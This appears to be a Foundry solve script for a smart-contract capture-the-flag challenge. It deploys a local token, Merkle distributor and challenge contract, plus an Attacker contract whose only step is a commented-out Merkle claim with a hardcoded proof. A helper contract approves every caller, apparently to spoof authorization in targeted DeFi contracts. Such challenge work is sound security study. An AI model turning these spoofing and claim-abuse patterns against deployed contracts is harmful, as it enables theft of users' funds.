// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Challenge.sol";
import "../src/InuToken.sol";

import "merkle-distributor/MerkleDistributor.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
}
interface IUniV1Factory {
    function createExchange(address token) external returns (address);
}
interface IUniV1Pair {
    function removeLiquidity(uint256 amount, uint256 min_eth, uint256 min_tokens, uint256 deadline) external returns (uint256, uint256);
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline) external payable returns (uint256);
}
interface D291Core {
    function executeActions(
        Action[] calldata actions,
        AbsoluteTokenAmount[] calldata requiredOutputs,
        address payable account
    ) external returns (AbsoluteTokenAmount[] memory);
    struct AbsoluteTokenAmount {
        address token;
        uint256 amount;
    }
    struct Action {
        bytes32 protocolAdapterName;
        ActionType actionType;
        TokenAmount[] tokenAmounts;
        bytes data;
    }
    struct TokenAmount {
        address token;
        uint256 amount;
        AmountType amountType;
    }
    enum ActionType { None, Deposit, Withdraw }
    enum AmountType { None, Relative, Absolute }
}


interface IStep2Target {
    function swap(
        address fromToken,
        address toToken,
        uint256 amount,
        uint256 minReturn,
        uint256[] memory distribution, // [Uniswap, Kyber, Bancor, Oasis]
        uint256 flags // 16 - Compound, 32 - Fulcrum, 64 - Chai, 128 - Aave, 256 - SmartToken, 1024 - bDAI
    ) external payable;

    function _swapOnBancorSafe(
        IERC20 fromToken,
        IERC20 toToken,
        uint256 amount
    ) external returns(uint256);
}
interface IStep3Target {
    function LetsInvest(address _TokenContractAddress, address _towhomtoissue) external payable returns (uint256);
}

interface IAccount {}
interface IAccountStorage {
    function setKeyData(address payable _account, uint256 _index, address _key) external;
    function setKeyStatus(address payable _account, uint256 _index, uint256 _status) external;
}
interface ITransferLogic {
    function enter(bytes calldata _data, bytes calldata _signature, uint256 _nonce) external;
}

contract Step5Helper {
    function manager() external view returns (address) {
        return address(this);
    }

    function isAuthorized(address sender) external view returns (bool) {
        return true;
    }
}

contract Solve is Script {
    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();
        Attacker at = new Attacker();

        // Test Env
        InuToken inu = new InuToken();
        bytes32 merkleRoot = 0x43c82b918f439b8608d0624cc9a557518faecb07d399460a737c4f9b62b32591;
        MerkleDistributor distributor = new MerkleDistributor(address(inu), merkleRoot);
        inu.transfer(address(distributor), 0xb16c7747f6a745eab00000);
        Challenge chal = new Challenge(distributor);
        at.setEnv(address(chal), address(distributor), address(inu));
        payable(address(at)).transfer(10 ether);
        at.step1();
        //at.step2();
        //at.step3();
        //at.step4();
        vm.stopBroadcast();
    }
}

interface ITargetStep9 {
    function execute(address user, uint256, /* debt */ bytes calldata data) external;
}


contract Attacker {
    Challenge challenge;
    MerkleDistributor merkleDistributor;
    InuToken inuToken;
    function setEnv(address chal_, address md_, address inu_) public {
        challenge = Challenge(chal_);
        merkleDistributor = MerkleDistributor(md_);
        inuToken = InuToken(inu_);
    }
    receive() external payable {}
    function step1() public {
        /*address target = 0xa57Feb49fec000000;
        bytes32[] memory proof = new bytes32[](18);
        proof[0] = 0x6f64839b23a4644753a1412e2b743ae60b2e476e7da5b1b1e532636df13a3a45;
        proof[1] = 0x01f47e7943ce518ae9d5067b36b2d6d8e9b6eac3129225b3c1054d69ae92175f;
        proof[2] = 0x3a0cc2c69772c6842548794530eecaa1d25aaa0a1ef0a8c55f6e9f43e297aab3;
        proof[3] = 0x0804d89cab4ff591d32b12e8522bbd3fd97e8b3a0678503bb5b39a96ef07c963;
        proof[4] = 0x5384023f049ba0ec28c290b59f768a3bdeefd50436c03351fb2db928d6cff9ff;
        proof[5] = 0xefca4735c415bf0ed66c827cdb21d72e5f480f44a815294e393b9401231a552d;
        proof[6] = 0x66072119ebfdd84af53cf05675b2f53277402283961189cbf06a6645befa5ebb;
        proof[7] = 0x27d4d981d7c01e18bc50a43fb57fbcbdea69a1ecb8e88b204e92584c0d733764;
        proof[8] = 0xd95a2e42b230e615ed639d355af6af8dfdb0825e537e591026f84d1c347ec8ca;
        proof[9] = 0x058e7f28ad45b8336ee08aafa0497e68731c6ec8400100f5b3dce07dd80bdf92;
        proof[10] = 0xc7991bf8d66c8f2d82f2040ba77244784c17e1754482ac1329ee7a32f8dcf15a;
        proof[11] = 0x1ba4faa9d7424b6f7d1d28e6304891ac5335a9f708e9fd92d09c8097555f49fa;
        proof[12] = 0xda1a4d06e8ae29bf4105dae5b6518bf7587a89c619a4068c127b7426003a27b1;
        proof[13] = 0x970da01df3f632958b65cb8ad2c385de6ec9e8910139f50df8354506e76b9f0a;
        proof[14] = 0x03f19d69300362e279fc5ccf5df8834fbbefb017c77f87784678057f5c766e0a;
        proof[15] = 0xc8db5593a5709dfaafbfd4a9af25b1abb7b488e0be6b16952595360f36d364e0;
        proof[16] = 0x05d87b90d16d65eca608285be05f09d6be06ed26e996e2b0f51b3aa33aaa78eb;
        proof[17] = 0xc61672b51620329157c09e93120384c7e539511991bb6ef9fc37f570f220f2f9;
        merkleDistributor.claim(0, target, 0, proof);*/
    }
}